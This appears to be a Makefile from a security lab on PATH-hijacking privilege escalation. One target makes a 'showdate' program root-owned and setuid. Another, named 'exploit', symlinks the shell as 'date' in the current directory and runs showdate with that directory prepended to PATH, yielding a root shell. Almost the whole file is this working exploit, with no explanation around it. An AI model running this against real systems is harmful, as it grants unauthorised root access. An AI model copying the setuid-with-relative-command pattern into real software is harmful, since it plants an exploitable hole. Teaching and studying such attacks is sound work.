all: set_permissions

exploit:
	ln -fs $(shell which sh) date
	PATH=$(shell pwd):$(PATH) ./showdate

clean:
	rm -f date

set_permissions: showdate
	sudo chown root:root ./$<
	sudo chmod u+s ./$<
